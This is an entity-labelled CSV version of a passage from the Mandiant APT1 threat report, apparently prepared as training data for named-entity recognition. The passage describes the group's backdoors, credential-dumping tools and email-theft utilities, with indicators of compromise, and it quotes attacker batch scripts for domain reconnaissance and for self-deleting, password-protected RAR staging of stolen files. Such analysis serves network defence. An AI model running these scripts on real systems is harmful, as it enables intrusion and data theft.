Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," 
backdoors are probably the most well-known 
kind of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," backdoor, and are the reason 
why some security companies refer to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
as the “",O
Mandiant_APT1_Report,Comment Crew,threat_actor
Mandiant_APT1_Report,.” A ,O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," backdoor 
is designed to retrieve a webpage from a C2 
server. It expects the webpage to contain 
special HTML tags; the backdoor will attempt 
to interpret the data between the tags as 
commands. Older versions of ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," read 
data between HTML comments, though over 
time ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," variants have evolved to read 
data contained within other types of tags. 
From direct observation, we can confirm 
that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, was using ,O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," backdoors as 
early as ",O
Mandiant_APT1_Report,July 2006,timestamp
Mandiant_APT1_Report,". However, the first compile time35 we have for ",O
Mandiant_APT1_Report,WEBC2-KT3,malware
Mandiant_APT1_Report, is ,O
Mandiant_APT1_Report,2004-01-23,timestamp
Mandiant_APT1_Report,", suggesting that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
has been crafting ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report, backdoors ,O
Mandiant_APT1_Report,since early 2004,timestamp
Mandiant_APT1_Report,. Based on the 400+ samples of ,O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," variants that we have 
accumulated, it appears that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, has direct access to developers who have continually released new ,O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," variants 
for over six years. 

For example, these two build paths, which were discovered inside ",O
Mandiant_APT1_Report,WEBC2-TABLE,malware
Mandiant_APT1_Report," samples, help to illustrate how ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
has been steadily building new ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," variants as part of a continuous development process:

sample a
MD5: ",O
Mandiant_APT1_Report,d7aa32b7465f55c368230bb52d52d885,ioc
Mandiant_APT1_Report,"
Compile date: ",O
Mandiant_APT1_Report,2012-02-23,timestamp
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,\work\code\2008-7-8muma\mywork\winInet_winApplication2009-8-7\mywork\aaaaaaa2012-2-23\Release\aaaaaaa.pdb,ioc
Mandiant_APT1_Report,"

sample B
MD5: ",O
Mandiant_APT1_Report,c1393e77773a48b1eea117a302138554,ioc
Mandiant_APT1_Report,"
Compile date: ",O
Mandiant_APT1_Report,2009-08-07,timestamp
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,D:\work\code\2008-7-8muma\mywork\winInet_winApplication2009-8-7\mywork\aaaaaaa\Release\aaaaaaa.pdb,ioc
Mandiant_APT1_Report,"

 

35 “Compile” refers to the process of transforming a programmer’s source code into a file that a computer can understand and execute. The compile 
date is easily accessible in the PE header of the resulting executable file unless the intruder takes additional steps to obfuscate it.

",O
Mandiant_APT1_Report,weBC2,malware
Mandiant_APT1_Report," families

",O
Mandiant_APT1_Report,WEBC2-AUSOV,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-ADSPACE,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-BOLID,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-CLOVER,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-CSON,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-DIV,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-GREENCAT,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-HEAD,malware
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,WEBC2-KT3,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-QBP,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-RAVE,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-TABLE,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-TOCK,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-UGX,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-YAHOO,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2-Y21K,malware
Mandiant_APT1_Report,"

… and many still uncategorized

what is a malware family?
A malware family is a collection of malware in which each 
sample shares a significant amount of code with all of 
the others. To help illustrate this, consider the following 
example from the physical world. There is now a vast array 
of computing tablets for sale. These include ",O
Mandiant_APT1_Report,Apple,org
Mandiant_APT1_Report,"’s iPad, 
",O
Mandiant_APT1_Report,Samsung,org
Mandiant_APT1_Report,"’s Galaxy Tab, and ",O
Mandiant_APT1_Report,Microsoft,org
Mandiant_APT1_Report,"’s Surface. Although 
these are all tablet computers, “under the hood” they are 
probably quite different. However, one can expect that 
an iPad 1 and an iPad 2 share a significant number of 
components — much more than, say, an iPad 1 and a 
",O
Mandiant_APT1_Report,Microsoft,org
Mandiant_APT1_Report," Surface. Thus it makes sense to refer to the iPad 
“family” and the Surface “family”. 

When it comes to computer programs, in general if they 
share more than 80% of the same code we consider them 
part of the same family. There are exceptions: for example, 
some files contain public and standard code libraries that 
we do not take into consideration when making a family 
determination. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 32 www.mandiant.com

A “build path” discloses the directory from which the programmer 
built and compiled his source code. These samples, compiled 2.5 
years apart, were compiled within a folder named “work\code\...\
mywork”. The instances of “work” suggest that working on ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," is 
someone’s day job and not a side project or hobby. Furthermore, the 
Sample A build string includes “",O
Mandiant_APT1_Report,2012-2-23,timestamp
Mandiant_APT1_Report,"” — which matches Sample 
A’s compile date. The Sample B build string lacks “",O
Mandiant_APT1_Report,2012-2-23,timestamp
Mandiant_APT1_Report,"” but 
includes “",O
Mandiant_APT1_Report,2009-8-7,timestamp
Mandiant_APT1_Report,"” — which also matches Sample B’s compile date. 
This suggests that the code used to compile Sample A was modified 
from code that was used to compile Sample B 2.5 years previously. The 
existence of “",O
Mandiant_APT1_Report,2008-7-8,timestamp
Mandiant_APT1_Report,"” suggests that the code for both samples was 
modified from a version that existed in ",O
Mandiant_APT1_Report,July 2008,timestamp
Mandiant_APT1_Report,", a year before Sample 
B was created. This series of dates indicates that developing and 
modifying the ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," backdoor is an iterative and long-term process.

",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report, backdoors typically give ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," attackers a short and 
rudimentary set of commands to issue to victim systems, including:
»» Open an interactive command shell (usually Windows’ cmd.exe)
»» Download and execute a file
»» Sleep (i.e. remain inactive) for a specified amount of time

",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," backdoors are often packaged with spear phishing emails. 
Once installed, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders have the option to tell victim systems 
to download and execute additional malicious software of their choice. 
",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report," backdoors work for their intended purpose, but they generally 
have fewer features than the “",O
Mandiant_APT1_Report,Standard Backdoors,malware
Mandiant_APT1_Report,"” described below. 

",O
Mandiant_APT1_Report,Standard Backdoors,malware
Mandiant_APT1_Report,"
The standard, non-WEBC2 ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," backdoor typically communicates 
using the HTTP protocol (to blend in with legitimate web traffic) or a 
custom protocol that the malware authors designed themselves. These 
backdoors give ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," intruders a laundry list of ways to control victim 
systems, including:
»» Create/modify/delete/execute programs
»» Upload/download files
»» Create/delete directories
»» List/start/stop processes
»» Modify the system registry 
»» Take screenshots of the user’s desktop
»» Capture keystrokes
»» Capture mouse movement
»» Start an interactive command shell
»» Create a Remote desktop (i.e. graphical) interface
»» Harvest passwords
»» Enumerate users
»» Enumerate other systems on the network
»» Sleep (i.e. go inactive) for a specified amount of time
»» Log off the current user
»» Shut down the system

",O
Mandiant_APT1_Report,SEASALT,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,LONGRUN,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2.TOCK,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2.YAHOO,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WARP TABMSGSQL,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2.CSONWEBC2.QBP,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,COMBOSWEBC2.DIV,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,COOKIEBAG,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,GLOOXMAIL,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,MINIASP,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,BOUNCER,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2.TABLE,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2.BOLIDKURTON,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,CALENDAR,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,GDOCUPLOAD,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,LIGHTBOLT,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2.Y21K,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2.KT32004,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,LIGHTDART,malware
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2005,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2006,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,MAPIGET,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,BISCUIT,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,MANITSMEWEBC2.UGX,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,STARSYPOUNDTARSIP,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,DAIRY,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,SWORD,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,HELAUTO,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2.AUSOVHACKSFASE,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,AURIGA,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2.CLOVERGREENCAT,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,MACROMAILGOGGLES,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,NEWSREELSWEBC2.RAVE,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2.ADSPACE,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,WEBC2.HEAD,malware
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,BANGAT,malware
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,APT 1,threat_actor
Mandiant_APT1_Report," MALWARE FAMILIES

",O
Mandiant_APT1_Report,GETMAIL,malware
Mandiant_APT1_Report,"

FIRST KNOWN COMPILE TIMES



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 33 www.mandiant.com

The ",O
Mandiant_APT1_Report,BISCUIT,malware
Mandiant_APT1_Report," backdoor (so named for the command “bdkzt”) is an illustrative example of the range of commands that 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, has built into its “standard” backdoors. ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, has used and steadily modified ,O
Mandiant_APT1_Report,BISCUIT,malware
Mandiant_APT1_Report, since as early as ,O
Mandiant_APT1_Report,2007,timestamp
Mandiant_APT1_Report,"
and continues to use it presently. 

taBLe 4: a subset of ",O
Mandiant_APT1_Report,BISCUIT,malware
Mandiant_APT1_Report," commands

Command Description
bdkzt Launch a command shell

ckzjqk Get system information

download ",O
Mandiant_APT1_Report," Transfer a file from the C2 server

exe ",O
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report," Launch a program as a specific user

exit Close the connection and sleep

lists ",O
Mandiant_APT1_Report," List servers on a Windows network. 

ljc Enumerate running processes and identify their owners.

sjc ",O
Mandiant_APT1_Report,|,O
Mandiant_APT1_Report," Terminate a process, either by process ID or by process name.

upload ",O
Mandiant_APT1_Report," Send a file to the C2 server

zxdosml ",O
Mandiant_APT1_Report," Send input to the command shell process (launched with “bdkzt”).

These functions are characteristic of most backdoors, and are not limited to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, or even ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report,". For example, anyone 
who wants to control a system remotely will likely put functions like “Upload/download files” into a backdoor.

Covert Communications
Some ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report, backdoors attempt to mimic legitimate Internet traffic other than the HTTP protocol. ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has created a 
handful of these, including:

taBLe 5: Backdoors that mimic legitimate communication protocols

Backdoor  Mimicked protocol

",O
Mandiant_APT1_Report,MaCroMaIL,malware
Mandiant_APT1_Report,  ,O
Mandiant_APT1_Report,MSN Messenger,software
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,GLooxMaIL,malware
Mandiant_APT1_Report,  ,O
Mandiant_APT1_Report,Jabber/XMPP,software
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,CaLenDar,malware
Mandiant_APT1_Report,  ,O
Mandiant_APT1_Report,Gmail Calendar,software
Mandiant_APT1_Report,"

When network defenders see the communications between these backdoors and their C2 servers, they might easily 
dismiss them as legitimate network traffic. Additionally, many of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s backdoors use SSL encryption so that 
communications are hidden in an encrypted SSL tunnel. We have provided ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s public SSL certificates in Appendix 
F so people can incorporate them into their network signatures.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 34 www.mandiant.com

Privilege Escalation

Escalating privileges involves acquiring items (most often usernames and passwords) that will allow access to more 
resources within the network. In this and the next two stages, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, does not differ significantly from other ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," 
intruders (or intruders, generally). ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," predominantly uses publicly available tools to dump password hashes from 
victim systems in order to obtain legitimate user credentials.

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has used these privilege escalation tools:

taBLe 6: Publicly available privilege escalation tools that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has used

tool Description  website

",O
Mandiant_APT1_Report,cachedump,tool
Mandiant_APT1_Report," This program extracts cached 
password hashes from a system’s 
registry 

 Currently packaged with fgdump (below)

",O
Mandiant_APT1_Report,fgdump,tool
Mandiant_APT1_Report," Windows password hash dumper  http://www.foofus.net/fizzgig/fgdump/

",O
Mandiant_APT1_Report,gsecdump,tool
Mandiant_APT1_Report," Obtains password hashes from the 
Windows registry, including the SAM 
file, cached domain credentials, and 
LSA secrets 

 http://www.truesec.se

",O
Mandiant_APT1_Report,lslsass,tool
Mandiant_APT1_Report," Dump active logon session password 
hashes from the lsass process 

 http://www.truesec.se

",O
Mandiant_APT1_Report,mimikatz,tool
Mandiant_APT1_Report," A utility primarily used for dumping 
password hashes 

 http://blog.gentilkiwi.com/mimikatz

",O
Mandiant_APT1_Report,pass-the-hash,technique
Mandiant_APT1_Report," toolkit

Allows an intruder to “pass” a 
password hash (without knowing the 
original password) to log in to systems 

 http://oss.coresecurity.com/projects/pshtoolkit.htm

",O
Mandiant_APT1_Report,pwdump7,tool
Mandiant_APT1_Report," Dumps password hashes from the 
Windows registry 

 http://www.tarasco.org/security/pwdump_7/

",O
Mandiant_APT1_Report,pwdumpx,tool
Mandiant_APT1_Report," Dumps password hashes from the 
Windows registry 

The tool claims its origin as http://reedarvin.thearvins.com/, 
but the site is not offering this software as of the date of this 
report 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 35 www.mandiant.com

Internal Reconnaissance

In the Internal Reconnaissance stage, the intruder collects information about the victim environment. Like most ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," 
(and non-APT) intruders, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," primarily uses built-in operating system commands to explore a compromised system 
and its networked environment. Although they usually simply type these commands into a command shell, sometimes 
intruders may use batch scripts to speed up the process. Figure 18 below shows the contents of a batch script that 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," used on at least four victim networks.

@echo off
ipconfig /all>>”C:\WINNT\Debug\1.txt”
net start>>”C:\WINNT\Debug\1.txt”
tasklist /v>>”C:\WINNT\Debug\1.txt”
net user >>”C:\WINNT\Debug\1.txt”
net localgroup administrators>>”C:\WINNT\Debug\1.txt”
netstat -ano>>”C:\WINNT\Debug\1.txt”
net use>>”C:\WINNT\Debug\1.txt”
net view>>”C:\WINNT\Debug\1.txt”
net view /domain>>”C:\WINNT\Debug\1.txt”
net group /domain>>”C:\WINNT\Debug\1.txt”
net group “domain users” /domain>>”C:\WINNT\Debug\1.txt”
net group “domain admins” /domain>>”C:\WINNT\Debug\1.txt”
net group “domain controllers” /domain>>”C:\WINNT\Debug\1.txt”
net group “exchange domain servers” /domain>>”C:\WINNT\Debug\1.txt”
net group “exchange servers” /domain>>”C:\WINNT\Debug\1.txt”
net group “domain computers” /domain>>”C:\WINNT\Debug\1.txt”

FIGure 18: an ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," batch script that automates reconnaissance

what is a password hash?
When a person logs in to a computer, website, email server, or any networked resource requiring a password, 
the supplied password needs to be verified. One way to do this would be to store the person’s actual password 
on the system that the person is trying to access, and to compare the typed password to the stored password. 
Although simple, this method is also very insecure: anyone who can access that same system will be able to 
see the person’s password. Instead, systems that verify passwords usually store password hashes. In simple 
terms, a password hash is a number that is mathematically generated from the person’s password. The 
mathematical methods (algorithms) used to generate password hashes will create values that are unique for 
all practical purposes. When a person supplies their password, the computer generates a hash of the typed 
password and compares it to the stored hash. If they match, the passwords are presumed to be the same and 
the person is allowed to log in.

It is supposed to be impossible to “reverse” a hash to obtain the original password. However, it is possible with 
enough computational resources to “crack” password hashes to discover the original password. (“Cracking” 
generally consists of guessing a large number of passwords, hashing them, and comparing the generated 
hashes to the existing hashes to see if any match.) Intruders will steal password hashes from victim systems 
in hopes that they can either use the hashes as-is (by “passing-the-hash”) or crack them to discover users’ 
passwords.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 36 www.mandiant.com

This script performs the following functions and saves the results to a text file:

»» Display the victim’s network configuration information

»» List the services that have started on the victim system

»» List currently running processes

»» List accounts on the system

»» List accounts with administrator privileges

»» List current network connections

»» List currently connected network shares

»» List other systems on the network

»» List network computers and accounts according to group (“domain controllers,” “domain users,” “domain 
admins,” etc.)

Lateral Movement

Once an ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," intruder has a foothold inside the network and a set of legitimate credentials,36 it is simple for the intruder 
to move around the network undetected:

»» They can connect to shared resources on other systems

»» They can execute commands on other systems using the publicly available “",O
Mandiant_APT1_Report,psexec,tool
Mandiant_APT1_Report,” tool from ,O
Mandiant_APT1_Report,Microsoft,org
Mandiant_APT1_Report," 
Sysinternals or the built-in Windows Task Scheduler (“at.exe”)

These actions are hard to detect because legitimate system administrators also use these techniques to perform 
actions around the network.

Maintain Presence

In this stage, the intruder takes actions to ensure continued, long-term control over key systems in the network 
environment from outside of the network. ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," does this in three ways.

1. Install new backdoors on multiple systems
Throughout their stay in the network (which could be years), ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," usually installs new backdoors as they claim more 
systems in the environment. Then, if one backdoor is discovered and deleted, they still have other backdoors they can 
use. We usually detect multiple families of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, backdoors scattered around a victim network when ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has been 
present for more than a few weeks.

2. use legitimate vPn credentials
",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," actors and hackers in general are always looking for valid credentials in order to impersonate a legitimate user. 
We have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," using stolen usernames and passwords to log into victim networks’ VPNs when the VPNs are 
only protected by single-factor authentication. From there they are able to access whatever the impersonated users are 
allowed to access within the network.

36 ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," uses the term “credentials” to refer to a userid and its corresponding, working password.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 37 www.mandiant.com

3. Log in to web portals
Once armed with stolen credentials, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders also attempt to log into web portals that the network offers. This 
includes not only restricted websites, but also web-based email systems such as Outlook Web Access.

Completing The Mission

Similar to other ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups we track, once ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," finds files of interest they pack them into archive files before stealing 
them. ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," intruders most commonly use the RAR archiving utility for this task and ensure that the archives are 
password protected. Sometimes ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders use batch scripts to assist them in the process, as depicted in Figure 
19. (The instances of “XXXXXXXX” obfuscate the text that was in the actual batch script.)

@echo off
cd /d c:\windows\tasks
rar.log a XXXXXXXX.rar -v200m “C:\Documents and Settings\Place\My 
Documents\XXXXXXXX” -hpsmy123!@#
del *.vbs
del %0

FIGure 19: an ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," batch script that bundles stolen files into rar archive files

After creating files compressed via RAR, the ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," attackers will transfer files out of the network in ways that are 
consistent with other ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups, including using the File Transfer Protocol (FTP) or their existing backdoors. Many 
times their RAR files are so large that the attacker splits them into chunks before transferring them. Figure 19 above 
shows a RAR command with the option “-v200m”, which means that the RAR file should be split up into 200MB 
portions.

.rar

FIGure 20: ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, bundles stolen files into rar archives before moving data to ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 38 www.mandiant.com

Unlike most other ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups we track, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, uses two email-stealing utilities that we believe are unique to ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". The 
first, ",O
Mandiant_APT1_Report,GETMAIL,malware
Mandiant_APT1_Report,", was designed specifically to extract email messages, attachments, and folders from within ",O
Mandiant_APT1_Report,Microsoft Outlook,software
Mandiant_APT1_Report," archive (“PST”) files. 

",O
Mandiant_APT1_Report,Microsoft Outlook,software
Mandiant_APT1_Report," archives can be large, often storing years’ worth of emails. They may be too large to transfer out 
of a network quickly, and the intruder may not be concerned about stealing every email. The ",O
Mandiant_APT1_Report,GETMAIL,malware
Mandiant_APT1_Report," utility allows 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders the flexibility to take only the emails between dates of their choice. In one case, we observed an ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
intruder return to a compromised system once a week for four weeks in a row to steal only the past week’s emails.

Whereas ",O
Mandiant_APT1_Report,GETMAIL,malware
Mandiant_APT1_Report," steals email in Outlook archive files, the second utility, ",O
Mandiant_APT1_Report,MAPIGET,malware
Mandiant_APT1_Report,", was designed specifically to steal 
email that has not yet been archived and still resides on a ",O
Mandiant_APT1_Report,Microsoft Exchange Server,software
Mandiant_APT1_Report,". In order to operate successfully, 
",O
Mandiant_APT1_Report,MAPIGET,malware
Mandiant_APT1_Report, requires username/password combinations that the Exchange server will accept. ,O
Mandiant_APT1_Report,MAPIGET,malware
Mandiant_APT1_Report," extracts email 
from specified accounts into text files (for the email body) and separate attachments, if there are any. 

english as a second Language
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,’s “It’s legit” email should not mislead someone into thinking that ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," personnel are all fluent in English, though 
some undoubtedly are. Their own digital weapons betray the fact that they were programmed by people whose first 
language is not English. Here are some examples of grammatically incorrect phrases that have made it into ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s 
tools over the years.

taBLe 7: examples of grammatically incorrect phrases in ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," malware

Phrase tool Compile date

If use it, key is the KEY. ",O
Mandiant_APT1_Report,GETMAIL,malware
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2005-08-18,timestamp
Mandiant_APT1_Report,"

Wether encrypt or not,Default is NOT. ",O
Mandiant_APT1_Report,GETMAIL,malware
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2005-08-18,timestamp
Mandiant_APT1_Report,"

ToolHelp API isn’t support on NT versions prior to ",O
Mandiant_APT1_Report,Windows 2000,software
Mandiant_APT1_Report,! ,O
Mandiant_APT1_Report,LIGHTDART,malware
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2006-08-03,timestamp
Mandiant_APT1_Report,"

No Doubt to Hack You, Writed by ",O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,MANITSME,malware
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2007-09-06,timestamp
Mandiant_APT1_Report,"

Type command disable.Go on! ",O
Mandiant_APT1_Report,HELAUTO,malware
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2008-06-16,timestamp
Mandiant_APT1_Report,"

File no exist. Simple Downloader 
(not profiled) 

",O
Mandiant_APT1_Report,2008-11-26,timestamp
Mandiant_APT1_Report,"

you specify service name not in Svchost\netsvcs, must be one of following ",O
Mandiant_APT1_Report,BISCUIT,malware
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2009-06-02,timestamp
Mandiant_APT1_Report,"

Can not found the PID ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report, (Uncat) ,O
Mandiant_APT1_Report,2009-08-11,timestamp
Mandiant_APT1_Report,"

Doesn’t started! ",O
Mandiant_APT1_Report,GREENCAT,malware
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2009-08-18,timestamp
Mandiant_APT1_Report,"

Exception Catched ",O
Mandiant_APT1_Report,MACROMAIL,malware
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2010-03-15,timestamp
Mandiant_APT1_Report,"

Are you sure to FORMAT Disk C With NTFS?(Y/N) ",O
Mandiant_APT1_Report,TABMSGSQL,malware
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2010-11-04,timestamp
Mandiant_APT1_Report,"

Shell is not exist or stopped! ",O
Mandiant_APT1_Report,TARSIP,malware
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2011-03-24,timestamp
Mandiant_APT1_Report,"

Reqfile not exist! ",O
Mandiant_APT1_Report,COOKIEBAG,malware
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2011-10-12,timestamp
Mandiant_APT1_Report,"

the url no respon! ",O
Mandiant_APT1_Report,COOKIEBAG,malware
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2011-10-12,timestamp
Mandiant_APT1_Report,"

Fail To Execute The Command ",O
Mandiant_APT1_Report,WEBC2-TABLE,malware
Mandiant_APT1_Report, ,O
